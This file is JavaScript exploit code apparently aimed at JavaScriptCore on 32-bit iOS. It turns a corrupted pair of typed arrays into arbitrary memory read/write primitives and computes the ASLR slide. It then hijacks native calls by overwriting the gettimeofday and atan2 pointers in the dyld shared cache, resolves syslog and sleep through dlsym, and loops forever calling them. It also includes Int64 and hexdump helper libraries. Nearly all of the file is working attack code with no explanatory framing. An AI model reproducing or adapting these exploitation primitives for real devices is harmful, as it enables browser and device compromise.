var reserve_addr = 0x1a0000;
var gettimeofday_addy = 0x34d63d3c;
var slide = 0x0;
var base = 0x0;

function get_dyld_shc_slide() {
	return read_u32((slide << 12) + reserve_addr + 20);
}

function call(addy) {
	var dyld_shc_slide = get_dyld_shc_slide();
	var tmp = read_u32(gettimeofday_addy + dyld_shc_slide);
	write_u32(gettimeofday_addy + dyld_shc_slide, addy);
	var d = new Date();
	write_u32(gettimeofday_addy + dyld_shc_slide, tmp);
}

function call4arg(addy, r0, r1, r2, r3) {
	var arg1 = new Int64("0x" + pad_left(r1.toString(16), '0', 8) + pad_left(r0.toString(16), '0', 8));
	var arg2 = new Int64("0x" + pad_left(r3.toString(16), '0', 8) + pad_left(r2.toString(16), '0', 8));
	/*
    var arg2 = new Int64(r3);
	arg1 = shiftInt64Left(arg1, 32);
	arg1 = Add(arg1, r0);
	arg2 = shiftInt64Left(arg2, 32);
	arg2 = Add(arg2, r2);
	*/
		
	arg1d = arg1.asDouble();
	arg2d = arg2.asDouble();

	delete arg1;
	delete arg2;
		
	var dyld_shc_slide = get_dyld_shc_slide();

	tmp = read_u32(0x346afc84 + dyld_shc_slide);
	write_u32(0x346afc84 + dyld_shc_slide, addy);
	ret = Math.atan2(arg1d, arg2d);
    write_u32(0x346afc84 + dyld_shc_slide, tmp);
    
    delete tmp;
    delete arg1d;
    delete arg2d;
    
    return (parseInt(Int64.fromDouble(ret)) & 0xffffffff) >>> 0;
}
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
	// The underlying byte array.
	var bytes = new Uint8Array(8);

	switch (typeof v) {
		case 'number':
			v = '0x' + Math.floor(v).toString(16);
		case 'string':
			if (v.startsWith('0x'))
				v = v.substr(2);
			if (v.length % 2 == 1)
				v = '0' + v;

			var bigEndian = unhexlify(v, 8);
			bytes.set(Array.from(bigEndian).reverse());
			break;
		case 'object':
			if (v instanceof Int64) {
				bytes.set(v.bytes());
			} else {
				if (v.length != 8)
					throw TypeError("Array must have excactly 8 elements.");
				bytes.set(v);
			}
			break;
		case 'undefined':
			break;
		default:
			throw TypeError("Int64 constructor requires an argument.");
	}

	// Return a double whith the same underlying bit representation.
	this.asDouble = function() {
		// Check for NaN
		if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
			throw new RangeError("Integer can not be represented by a double");

		return Struct.unpack(Struct.float64, bytes);
	};

	// Return a javascript value with the same underlying bit representation.
	// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
	// due to double conversion constraints.
	this.asJSValue = function() {
		if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
			throw new RangeError("Integer can not be represented by a JSValue");

		// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
		this.assignSub(this, 0x1000000000000);
		var res = Struct.unpack(Struct.float64, bytes);
		this.assignAdd(this, 0x1000000000000);

		return res;
	};

	// Return the underlying bytes of this number as array.
	this.bytes = function() {
		return Array.from(bytes);
	};

	// Return the byte at the given index.
	this.byteAt = function(i) {
		return bytes[i];
	};

	// Return the value of this number as unsigned hex string.
	this.toString = function() {
		return '0x' + hexlify(Array.from(bytes).reverse());
	};

	// Basic arithmetic.
	// These functions assign the result of the computation to their 'this' object.

	// Decorator for Int64 instance operations. Takes care
	// of converting arguments to Int64 instances if required.
	function operation(f, nargs) {
		return function() {
			if (arguments.length != nargs)
				throw Error("Not enough arguments for function " + f.name);
			for (var i = 0; i < arguments.length; i++)
				if (!(arguments[i] instanceof Int64))
					arguments[i] = new Int64(arguments[i]);
			return f.apply(this, arguments);
		};
	}

	// this = -n (two's complement)
	this.assignNeg = operation(function neg(n) {
		for (var i = 0; i < 8; i++)
			bytes[i] = ~n.byteAt(i);

		return this.assignAdd(this, Int64.One);
	}, 1);

	// this = a + b
	this.assignAdd = operation(function add(a, b) {
		var carry = 0;
		for (var i = 0; i < 8; i++) {
			var cur = a.byteAt(i) + b.byteAt(i) + carry;
			carry = cur > 0xff | 0;
			bytes[i] = cur;
		}
		return this;
	}, 2);

	// this = a - b
	this.assignSub = operation(function sub(a, b) {
		var carry = 0;
		for (var i = 0; i < 8; i++) {
			var cur = a.byteAt(i) - b.byteAt(i) - carry;
			carry = cur < 0 | 0;
			bytes[i] = cur;
		}
		return this;
	}, 2);

	// this = a ^ b
	this.assignXor = operation(function sub(a, b) {
		for (var i = 0; i < 8; i++) {
			bytes[i] = a.byteAt(i) ^ b.byteAt(i);
		}
		return this;
	}, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
	var bytes = Struct.pack(Struct.float64, d);
	return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
	return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
	return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
	return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
	return (new Int64()).assignXor(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// That's all the arithmetic we need for exploiting WebKit.. :)
/*
 *  turn a uint32_t into a little-endian 4 byte array
 */
function u32_to_u8x4(val) {
	u8x4 = new Uint8Array(0x4);

	val_ = val >>> 0;

	u8x4[0] = ((val_ >>  0) & 0xff);
	u8x4[1] = ((val_ >>  8) & 0xff);
	u8x4[2] = ((val_ >> 16) & 0xff);
	u8x4[3] = ((val_ >> 24) & 0xff);

	return u8x4;
}

/*
 *  turn a uint16_t into a little-endian 2 byte array
 */
function u16_to_u8x2(val) {
	u8x2 = new Uint8Array(0x2);

	val_ = val >>> 0;

	u8x2[0] = ((val_ >>  0) & 0xff);
	u8x2[1] = ((val_ >>  8) & 0xff);

	return u8x2;
}

/*
 *  turn a little-endian 4 byte array into a uint32_t
 */
function u8x4_to_u32(buf) {
	u32  = 0x0;

	u32 += (buf[0] <<  0);
	u32 += (buf[1] <<  8);
	u32 += (buf[2] << 16);
	u32 += (buf[3] << 24);

	return u32 >>> 0;
}

/*
 *  turn a little-endian 2 byte array into a uint16_t
 */
function u8x2_to_u16(buf) {
	u16  = 0x0;

	u16 += (buf[0] <<  0);
	u16 += (buf[1] <<  8);

	return u16 >>> 0;

}
var MAX_SLIDE = 0x3;
var MIN_SLIDE = 0x1;

try {
	log("we out here in jsc");
} catch (e) {
	/*
	 *  we don't have log. :(
	 */

	log = function (){};
}

function main() {
	/*
	 *  get slide and calculate slid base
	 *  remember, 32-bit *OS defaults to 0x4000 for the unslid base for exec's
	 * 
	 *  so, take the slide, shift it by 12 bits (aslr is calc'd by taking a
	 *  random byte and shifting it 12 bits, in this case the page size, 4096
	 *  (0x1000) bytes), and add it to the unslid base.
	 */

	slide = get_our_slide();
	base = 0x4000 + (slide << 12);
	slid = (slide << 12);
	//	call(0x41424344);

	log("slide=0x" + slide.toString(16));
	log("*(uint8_t*)base = 0x" + read_u8(base).toString(16));
	log("*(uint16_t*)base = 0x" + read_u16(base).toString(16));
	log("*(uint32_t*)base = 0x" + read_u32(base).toString(16));

	write_u32(0x144444, 0x69691337);

	log("writing to first mapped loc");
//	write_u32(0x422300, 0x41414141);
	log("writing to second mapped loc");
//	write_u32(0x422300, 0x41414141);
	log("survived both writes!");

	child.a = parent;
	
	predicted_jsobject_addy = 0x422200;
	buf = read_buf(predicted_jsobject_addy, 0x200);

	log("hexdump of predicted jsobject loc:");
	log(hexdump(buf, 8, 2, predicted_jsobject_addy, 8, "0x"));

	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
	var shc_slide = read_u32(0x1a0000 + 20 + slid);
	write_str(0x148000, "get rekt from jsc\0");
	write_str(0x149000, "syslog\0");
	write_str(0x14a000, "sleep\0");
	while (true) {
		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, 0x2, 0x3);
		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
	}
/*
	for (i = 0; i < 0x1000; i++) {
		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
	}*/

//	call(0x9ac54 + (slide << 12));
//	write_u32(0x1013b8, 0x41414141);
//	call(0x41414141);

//	call(0x56ab9 + (slide << 12));

	log("still alive");
};
var VECTOR_OFFSET = 0x10;

/*
 *  read uint8_t
 */
function read_u8(addy) {
	u8x4 = u32_to_u8x4(addy);

	/*
	 *  `parent` is a Uint8Array of length 0x100.
	 *  `child` is also a Uint8Array of length 0x100.
	 *  `parent`'s `vector`, its pointer to where its data is stored, has been
	 *  modified to point to the `child` object in memory.
	 *  as such, accessing `parent` will allow for modifying the `child` object.
	 *  
	 *  the way this is used is by writing to `child`'s `vector` so it points to
	 *  arbitrary memory. then, we can access `child`, and we now have arbitrary
	 *  r/w
	 */

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return child[0];
}

/*
 *  read uint16_t
 */
function read_u16(addy) {
	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return u8x2_to_u16(child);

}

/*
 *  read uint32_t
 */
function read_u32(addy) {
	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return u8x4_to_u32(child);
}

/*
 *  read a buffer
 */
function read_buf(addy, len) {
	var buf = new Uint8Array(len);

	for (cur_addy = addy; cur_addy < (addy + len); cur_addy++) {
		buf[cur_addy - addy] = read_u8(cur_addy);
	}

	return buf;
}

/*
 *  write a buffer
 */
function write_buf(addy, buf, len) {
	for (cur_addy = addy; cur_addy < (addy + len); cur_addy++) {
		write_u8(cur_addy, buf[cur_addy - addy]);
	}

	return buf;
}

/*
 *  write uint8_t
 */
function write_u8(addy, what) {
	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	child[0] = what;
}

/*
 *  write uint16_t
 */
function write_u16(addy, what) {
	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	u8x2 = u16_to_u8x2(what);
	child[0] = u8x2[0];
	child[1] = u8x2[1];
}

/*
 *  write uint32_t
 */
function write_u32(addy, what) {
	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	u8x4 = u32_to_u8x4(what);
	child[0] = u8x4[0];
	child[1] = u8x4[1];
	child[2] = u8x4[2];
	child[3] = u8x4[3];
}

/*
 *  get process slide
 */
function get_our_slide() {
	for (var slide = MAX_SLIDE; slide >= MIN_SLIDE; slide--) {
		if (read_u32((slide << 12) + 0x4000) == 0xfeedface) {
			return slide;
		}
	}
}

function write_str(addy, s) {
	for (cur_addy = addy; cur_addy < (addy + s.length); cur_addy++) {
		write_u8(cur_addy, s.charCodeAt(cur_addy - addy));
	}

	return s;
}


function prim_dump_u32(buf) {
	s = "";

	for (var i = 0; i < buf.length; i += 4) {
		tmp = [];

		tmp.push(buf[i + 0]);
		tmp.push(buf[i + 1]);
		tmp.push(buf[i + 2]);
		tmp.push(buf[i + 3]);

		s += "0x" + pad_left((0x422200 + i).toString(16), "0", 8);
		s += ": ";
		s += "0x" + pad_left(u8x4_to_u32(tmp).toString(16), "0", 8);
		if (u8x4_to_u32(tmp) >= 0x1800000 && u8x4_to_u32(tmp) < 0x1900000) {
			s += " -> 0x" + pad_left(read_u32(u8x4_to_u32(tmp)).toString(16), "0", 8);
			s += "\n";
			val = read_u32(u8x4_to_u32(tmp));
			if (val >= 0x1800000 && val < 0x1900000) {
				buf = read_buf(val, 0x100);
				s += (hexdump(buf, 8, 2, val, 8, "0x"));
			}
		}
		s += "\n";
	}

	return s;
}

function pad_left(s, c, n) {
	s_ = s;

	if (s_.length < n) {
		s_ = c.repeat(n - s_.length) + s_;
	}

	return s_;
}

function str_to_uint8_buf(s) {
	buf = new Uint8Array(s.length);

	for (i = 0; i < s.length; i++) {
		buf[i] = s.charCodeAt(i);
	}

	return buf;
}

/*
 *  HOLY UGLY BATMAN!
 */
function hexdump(buf, cols, col_split, base, pad_base, base_prefix) {
	s = "";
	if (buf.constructor != Uint8Array) {
		buf = str_to_uint8_buf(buf);
	}

	for (i = 0; i < buf.length; i += (cols * col_split)) {
		cur_base = base + i;
		s += base_prefix + pad_left(cur_base.toString(16), "0", pad_base) + ": ";
		for (j = i; j < (i + (cols * col_split)); j += col_split) {
			for (k = j; k < (j + col_split); k++) {
				val = buf[k];
				try {
					s += pad_left(val.toString(16), "0", 2);
				} catch (e) {
					s += "	";
				}
			}
			s += " ";
		}

		for (j = i; j < (i + (cols * col_split)); j++) {
			val = buf[j];

			if (val < 0x20 || val >= 0x80) {
				val = 0x2e; // period
			}

			chr = String.fromCharCode(val);
			s += chr;
		}

		s += "\n";
	}

	return s;
}

/*
 *  HEX SHIT
 */
function prim_hexdump(buf) {
	s = "";

	for (i = 0; i < buf.length; i++) {
		val = buf[i];
		s += pad_left(val.toString(16), "0", 2);
	}

	return s;
}
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
		res.push(hex(bytes[i]));

	return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
		throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
		bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

	return bytes;
}

function hexdump(data) {
	if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
		data = Array.from(data);

	var lines = [];
	for (var i = 0; i < data.length; i += 16) {
		var chunk = data.slice(i, i+16);
		var parts = chunk.map(hex);
		if (parts.length > 8)
			parts.splice(8, 0, ' ');
		lines.push(parts.join(' '));
	}

	return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
	// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
	var buffer      = new ArrayBuffer(8);
	var byteView    = new Uint8Array(buffer);
	var uint32View  = new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
		pack: function(type, value) {
			var view = type;        // See below
			view[0] = value;
			return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
		},

		unpack: function(type, bytes) {
			if (bytes.length !== type.BYTES_PER_ELEMENT)
				throw Error("Invalid bytearray");

			var view = type;        // See below
			byteView.set(bytes);
			return view[0];
		},

		// Available types.
		int8:    byteView,
		int32:   uint32View,
		float64: float64View
	};
})();

main();
